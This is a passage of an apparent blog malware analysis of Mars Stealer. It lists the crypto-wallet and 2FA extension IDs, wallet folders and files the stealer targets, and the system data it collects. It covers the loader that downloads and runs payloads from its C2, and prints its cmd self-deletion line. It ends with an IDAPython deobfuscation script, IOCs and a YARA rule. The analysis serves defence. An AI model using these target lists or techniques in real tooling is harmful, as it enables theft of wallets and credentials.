      <td>nlgbhdfgdhgbiamfdfmbikcdghidoadd</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>OneKey</td>
      <td>infeboajgfhgbjpjbeppbkgnabfdkdaf</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>LeafWallet</td>
      <td>cihmoadaighcejopammfbmddcmdekcje</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>DAppPlay</td>
      <td>lodccjjbdhfakaekdiahmedfbieldgik</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>BitClip</td>
      <td>ijmpgkjfkbfhoebgogflfebnmejmfbml</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Steem Keychain</td>
      <td>lkcjlnjfpbikmcmbachjpdbijejflpcm</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Nash Extension</td>
      <td>onofpnbbkehpmmoabgpcpmigafmmnjhl</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Hycon Lite Client</td>
      <td>bcopgchhojmggmffilplmbdicgaihlkp</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>ZilPay</td>
      <td>klnaejjgbibmhlephnhpmaofohgkpgkd</td>
    </tr>
    <tr>
      <td>Crypto</td>
      <td>Coin98 Wallet</td>
      <td>aeachknmefphepccionboohckonoeemg</td>
    </tr>
    <tr>
      <td>2FA</td>
      <td>Authenticator</td>
      <td>bhghoamapcdpbohphigoooaddinpkbai</td>
    </tr>
    <tr>
      <td>2FA</td>
      <td>Authy</td>
      <td>gaedmjdfmmahhbjefcbgaolhhanlaolb</td>
    </tr>
    <tr>
      <td>2FA</td>
      <td>EOS Authenticator</td>
      <td>oeljdldpnmdbchonielidgobddffflal</td>
    </tr>
    <tr>
      <td>2FA</td>
      <td>GAuth Authenticator</td>
      <td>ilgcnhelpchnceeipipijaljkblbcobl</td>
    </tr>
    <tr>
      <td>2FA</td>
      <td>Trezor Password Manager</td>
      <td>imloifkgjagghnncjkhggdhalmcnfklk</td>
    </tr>
  </tbody>
</table>

<h1 id="crypto-wallets">Crypto Wallets</h1>

<p>Mars does not just stop at targeting crypto currencies via browser extensions. Many people prefer not to use third-party applications and services to store their digital currency.</p>

<p>Mars will go through various folders looking for specific files related to cryptocurrency.</p>

<p>The first paramter detmerines the path if 0 then it’s under %appdata%  if 1 it’s under %localappdata%</p>

<p>then it search for other wallets with regex <code class="language-plaintext highlighter-rouge">*wallet*.dat</code> under %appdata%</p>

<p><img src="attachment:36.PNG" alt="36.PNG" /></p>

<p>Mars have dedicated functionality to target the following crypto wallets:</p>

<table>
  <thead>
    <tr>
      <th>Wallet name</th>
      <th>Wallet folder</th>
      <th>Regex</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Ethereum</td>
      <td>%appdata%\Ethereum\</td>
      <td>keystore</td>
    </tr>
    <tr>
      <td>Electrum</td>
      <td>%appdata%\Electrum\wallets\</td>
      <td>.</td>
    </tr>
    <tr>
      <td>Electrum LTC</td>
      <td>%appdata%\Electrum-LTC\wallets\</td>
      <td>.</td>
    </tr>
    <tr>
      <td>Exodus</td>
      <td>%appdata%\Exodus\</td>
      <td>exodus.conf.json, window-state.json, \Exodus\exodus.wallet\, passphrase.json, seed.seco, info.seco</td>
    </tr>
    <tr>
      <td>Electron Cash</td>
      <td>%appdata%\ElectronCash\wallets\</td>
      <td>default_wallet</td>
    </tr>
    <tr>
      <td>MultiDoge</td>
      <td>%appdata%\MultiDoge\</td>
      <td>multidoge.wallet</td>
    </tr>
    <tr>
      <td>Jaxx</td>
      <td>%appdata%\jaxx\Local Storage\</td>
      <td>file__0.localstorage</td>
    </tr>
    <tr>
      <td>Atomic</td>
      <td>%appdata%\atomic\Local Storage\leveldb\</td>
      <td>000003.log, CURRENT, LOCK, LOG, MANIFEST.000001, 0000*</td>
    </tr>
    <tr>
      <td>Binance</td>
      <td>%appdata%\Binance\</td>
      <td>app-store.json</td>
    </tr>
    <tr>
      <td>Coinomi</td>
      <td>%localappdata%\Coinomi\Coinomi\wallets\</td>
      <td><code class="language-plaintext highlighter-rouge">*.wallet, *.config </code></td>
    </tr>
    <tr>
      <td>Other wallets</td>
      <td>%appdata%</td>
      <td><code class="language-plaintext highlighter-rouge">*wallet*.dat</code></td>
    </tr>
  </tbody>
</table>

<h1 id="system-info">System info</h1>
<p>The malware grabs system info and store it in system.txt file</p>
<ol>
  <li>IP and country</li>
  <li>Working path to EXE file</li>
  <li>Local time and time zone</li>
  <li>Language system</li>
  <li>Language keyboard layout</li>
  <li>Notebook or desktop</li>
  <li>Processor model</li>
  <li>Computer name</li>
  <li>User name</li>
  <li>Domain computer name</li>
  <li>Machine ID</li>
  <li>GUID</li>
  <li>Installed software and their versions</li>
</ol>

<p>Mars althouge takes screenshot and then add all stolen files to a zip file which it will exfiltrate back to the c2 and get loader config.</p>

<h1 id="loader">Loader</h1>

<p>Malware gets loader config as a response after exfiltrating Data.
This config looks like  download_URL|environment_variable_name|startup_parameter| (download link, An environment variable name and folder name [ File path ], start-up parameters).</p>

<p>After pasring the config Mars calls <code class="language-plaintext highlighter-rouge">download_file()</code> function with the url and a path which the file will be saved in . Then calls <code class="language-plaintext highlighter-rouge">ShellExecuteExA()</code> to execute executable with give paramters retrieved from the config.</p>

<p><img src="attachment:37.PNG" alt="37.PNG" /></p>

<p><img src="attachment:38-3.PNG" alt="38-3.PNG" /></p>

<h1 id="self-deletion">Self Deletion</h1>

<p>Malware gets the path to itself by using <code class="language-plaintext highlighter-rouge">GetModuleFileName()</code> and calls <code class="language-plaintext highlighter-rouge">ShellExecuteExA()</code> which executes the following command</p>

<p><code class="language-plaintext highlighter-rouge">"C:/Windows/System32/cmd.exe" /c timeout /t 5 &amp; del /f / path_To_file &amp; exit</code></p>

<p>After 5 seconds the executable will be deleted.</p>

<p><img src="attachment:39-3.PNG" alt="39-3.PNG" /></p>

<h1 id="generalized--idapython-script-using-patterns">Generalized  idapython Script using patterns</h1>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">idautils</span> <span class="p">,</span> <span class="n">idc</span><span class="p">,</span> <span class="n">idaapi</span><span class="p">,</span> <span class="n">ida_search</span><span class="p">,</span> <span class="n">ida_bytes</span><span class="p">,</span> <span class="n">ida_auto</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="n">decrypt_strings</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">seg_mapping</span> <span class="o">=</span> <span class="p">{</span><span class="n">idaapi</span><span class="p">.</span><span class="n">getseg</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="n">name</span><span class="p">:</span> <span class="p">(</span><span class="n">idaapi</span><span class="p">.</span><span class="n">getseg</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="n">start_ea</span><span class="p">,</span> <span class="n">idaapi</span><span class="p">.</span><span class="n">getseg</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="n">end_ea</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span>
                   <span class="n">idautils</span><span class="p">.</span><span class="n">Segments</span><span class="p">()}</span>
<span class="n">start</span> <span class="o">=</span> <span class="n">seg_mapping</span><span class="p">[</span><span class="mh">0x1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">end</span> <span class="o">=</span> <span class="n">seg_mapping</span><span class="p">[</span><span class="mh">0x1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
    
<span class="k">def</span> <span class="nf">sanitize_string</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">name</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">])[:</span><span class="mi">20</span><span class="p">].</span><span class="n">capitalize</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">X0r</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">getData</span> <span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">key_addr</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="n">data_addr</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">key_addr</span><span class="p">)</span>
    <span class="n">key_length_addr</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span>
    <span class="n">length</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">key_length_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">key_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="n">length</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span>  <span class="n">idc</span><span class="p">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">data_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="n">length</span><span class="p">)</span>
    <span class="k">return</span>  <span class="n">key</span> <span class="p">,</span> <span class="n">data</span> <span class="p">,</span><span class="n">length</span>


<span class="k">def</span> <span class="nf">rename_APIs</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span><span class="n">end</span><span class="p">):</span>
    
    <span class="n">func_addr</span> <span class="o">=</span> <span class="n">ea</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"push"</span>  <span class="p">)</span><span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_imm</span><span class="p">):</span>
            <span class="n">name</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_strlit_contents</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"mov"</span>  <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_reg</span><span class="p">)</span><span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_mem</span><span class="p">))</span> <span class="p">:</span>
            <span class="n">temp_name</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_name</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
            <span class="k">if</span> <span class="s">"Str_"</span> <span class="o">==</span> <span class="n">temp_name</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]:</span>
                <span class="n">name</span> <span class="o">=</span> <span class="n">temp_name</span><span class="p">[</span><span class="mi">4</span><span class="p">::]</span>
                <span class="k">break</span>
        <span class="n">ea</span> <span class="o">=</span>  <span class="n">idc</span><span class="p">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
        
    <span class="n">ea</span> <span class="o">=</span> <span class="n">func_addr</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"mov"</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_mem</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_reg</span><span class="p">):</span>
                <span class="n">global_var</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">idc</span><span class="p">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">global_var</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">SN_NOWARN</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">name</span>
        <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">API_resolve</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">):</span>
    <span class="n">Loadlibrarya_addr</span> <span class="o">=</span> <span class="mh">0x0</span>
    <span class="n">GetProcAddress_pattern</span> <span class="o">=</span> <span class="s">"8B 55 ?? 52 8B 45 ?? 8B 4D ??  8B 55 ?? 03 14 ?? 52 E8 ?? ?? ?? ?? 83 C4 ??  85 C0 75 ??"</span>
    <span class="n">GetProcAddress_addr</span> <span class="o">=</span> <span class="n">ida_search</span><span class="p">.</span><span class="n">find_binary</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">GetProcAddress_pattern</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_DOWN</span><span class="p">)</span>
    <span class="n">GetProcAddress_addr</span> <span class="o">=</span> <span class="n">idaapi</span><span class="p">.</span><span class="n">get_func</span><span class="p">(</span><span class="n">GetProcAddress_addr</span><span class="p">).</span><span class="n">start_ea</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Traget fucntion found at {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">GetProcAddress_addr</span><span class="p">)))</span>

    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="p">.</span><span class="n">XrefsTo</span><span class="p">(</span><span class="n">GetProcAddress_addr</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">ref</span><span class="p">.</span><span class="n">frm</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">rename_APIs</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">"Loadlibrarya"</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
                <span class="n">Loadlibrarya_addr</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">end</span><span class="p">),</span> <span class="n">end</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Loadlibrarya_addr</span><span class="p">))</span>


    <span class="n">new_GetProcAddress_addr</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">end</span><span class="p">),</span> <span class="n">end</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="p">.</span><span class="n">XrefsTo</span><span class="p">(</span><span class="n">new_GetProcAddress_addr</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">ref</span><span class="p">.</span><span class="n">frm</span>
        <span class="n">rename_APIs</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="p">.</span><span class="n">XrefsTo</span><span class="p">(</span><span class="n">Loadlibrarya_addr</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">ref</span><span class="p">.</span><span class="n">frm</span>
        <span class="n">rename_APIs</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>

        
<span class="k">def</span> <span class="nf">resolve_strings</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">):</span>
    <span class="n">xor_pattern</span> <span class="o">=</span> <span class="s">"8b 4d ?? 03 4d ?? 0f be 19 8b 55 ?? 52 e8 ?? ?? ?? ?? 83 c4 ?? 8b c8 8b 45 ?? 33 d2 f7 f1 8b 45 ?? 0f be 0c 10 33 d9 8b 55 ?? 03 55 ?? 88 1a eb be"</span>
    <span class="n">xor_fun_addr</span> <span class="o">=</span> <span class="n">ida_search</span><span class="p">.</span><span class="n">find_binary</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">xor_pattern</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_DOWN</span><span class="p">)</span>
    <span class="n">xor_fun_addr</span> <span class="o">=</span> <span class="n">idaapi</span><span class="p">.</span><span class="n">get_func</span><span class="p">(</span><span class="n">xor_fun_addr</span><span class="p">).</span><span class="n">start_ea</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Traget fucntion found at {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">xor_fun_addr</span><span class="p">)))</span>

    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="p">.</span><span class="n">XrefsTo</span><span class="p">(</span><span class="n">xor_fun_addr</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">ref</span><span class="p">.</span><span class="n">frm</span>
        <span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">getData</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="n">decrypt_string</span> <span class="o">=</span> <span class="n">X0r</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">set_cmt</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">decrypt_string</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">decrypt_strings</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypt_string</span><span class="p">)</span>
        <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">end</span><span class="p">),</span><span class="n">end</span><span class="p">)</span>
        <span class="n">global_var</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">global_var</span><span class="p">,</span> <span class="s">"Str_"</span> <span class="o">+</span> <span class="n">sanitize_string</span><span class="p">(</span><span class="n">decrypt_string</span><span class="p">),</span> <span class="n">SN_NOWARN</span><span class="p">)</span>
        
<span class="k">def</span> <span class="nf">anit_reverse</span><span class="p">():</span>
    <span class="n">ea</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">ea</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">ida_search</span><span class="p">.</span><span class="n">find_binary</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">BADADDR</span><span class="p">,</span> <span class="s">"74 ? 75 ?"</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_NEXT</span> <span class="o">|</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_DOWN</span><span class="p">),</span>
                 <span class="c1"># JZ / JNZ
</span>                 <span class="n">ida_search</span><span class="p">.</span><span class="n">find_binary</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">BADADDR</span><span class="p">,</span> <span class="s">"75 ? 74 ?"</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span>
                                        <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_NEXT</span> <span class="o">|</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_DOWN</span><span class="p">))</span>  <span class="c1"># JNZ / JZ
</span>        <span class="k">if</span> <span class="n">ea</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">BADADDR</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">)</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">)</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">)</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">anit_reverse</span><span class="p">()</span>
    <span class="n">resolve_strings</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">)</span>
    <span class="n">API_resolve</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">)</span>


<span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<h1 id="iocs">IOCs</h1>

<ul>
  <li>hash : 4bcff4386ce8fadce358ef0dbe90f8d5aa7b4c7aec93fca2e605ca2cbc52218b</li>
  <li>C2 Server 194.87.218.39</li>
  <li>C2 Domains:
    <ol>
      <li>http://194[.]87[.]218[.]39/request [ to get config ]</li>
      <li>http://194[.]87[.]218[.]39/RyC66VfSGP[.]php [ get external Dlls and  exfiltration]</li>
    </ol>
  </li>
</ul>

<h1 id="yara">YARA</h1>

<p>rule Mars_Stealer: Mars Stealer
{
    meta:
        Author = “XJUNIOR”
        Description = “Mars Stealer v8 Detection”</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings:
    $xor ={8b 4d ?? 03 4d ?? 0f be 19 8b 55 ?? 52 e8 ?? ?? ?? ?? 83 c4 ?? 8b c8 8b 45 ?? 33 d2 f7 f1 8b 45 ?? 0f be 0c 10 33 d9 8b 55 ?? 03 55 ?? 88 1a eb be}
    $debug = {64 A1 30 00 00 00 80 78 02 00}
	$thread_func = {B8 01 00 00 00   85 ??  74 ?? E8 ?? ?? ?? ?? 85 ?? 74 ?? 6A 00 FF ?? ?? ?? ?? ?? 6A ?? FF ?? ?? ?? ?? ?? EB ??}

    $api1 = "LocalAlloc" ascii
    $api2 = "VirtualProtect" ascii
    $api3 = "SetFileTime" ascii
    $api4 = "LocalFileTimeToFileTime" ascii
    $api5 = "HeapFree" ascii
    $api6 = "VirtualFree" ascii
    $api7 = "VirtualAlloc" ascii

    $s1 = "DPAPI" ascii
    $s2 = "memset" ascii
    $s3 = "msvcrt.dll" ascii
    $s4 = "_mbsnbcpy" ascii
    $s5 = "_mbsstr" ascii

condition:
    uint16(0) == 0x5A4D and 4 of($api*) and 2 of($s*)  and $debug  and $xor  and $thread_func
</code></pre></div></div>

<p>}</p>

        
      </section>

      <footer class="page__meta">
        
        


  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#jekyll" class="page__taxonomy-item p-category" rel="tag">Jekyll</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-05-14">May 14, 2022</time></p>

      </footer>

      <section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?via=mmistakes&text=mars%20https%3A%2F%2Fx-junior.github.io%2F%2Fjekyll%2FMars%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fx-junior.github.io%2F%2Fjekyll%2FMars%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fx-junior.github.io%2F%2Fjekyll%2FMars%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/jekyll/post-exclude-search/" class="pagination--pager" title="Exclude Post from Search Index
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h2 class="page__related-title">You May Also Enjoy</h2>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/jekyll/post-exclude-search/" rel="permalink">Exclude Post from Search Index
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">This post should not appear in the search index because it has the following YAML Front Matter:

</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
      
        
